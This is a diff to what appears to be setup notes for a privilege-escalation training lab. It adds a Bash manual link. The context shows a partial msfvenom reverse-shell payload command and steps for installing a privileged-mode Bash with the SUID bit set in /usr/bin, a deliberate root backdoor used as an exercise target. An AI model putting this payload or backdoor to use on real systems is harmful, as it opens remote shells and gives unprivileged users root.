@@ -54,7 +54,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> 
 1. Add two additional users the box, with different passwords. These users should not be able to use `sudo`. Use the only one of the users for the following steps.
 2. Create a "Step 4" folder on the desktop of the first user.
 3. Build the modified Bash shell in the Linux PrivEsc folder in the repo with `./configure` and `make`. Name it `shell`.
-      * This modification always runs the Bash shell in privileged mode (so that the SUID bit won't be ignored by default).
+      * This modification always runs the Bash shell in privileged mode (so that the SUID bit won't be [ignored by default](https://www.gnu.org/software/bash/manual/bash.html)).
       * A pre-built `shell` for the Linux Exercises box is also in the folder.
 4. Place the `shell` in the `/usr/bin` folder.
 5. Set the owner and group (if applicable) and the SUID bit on the file:
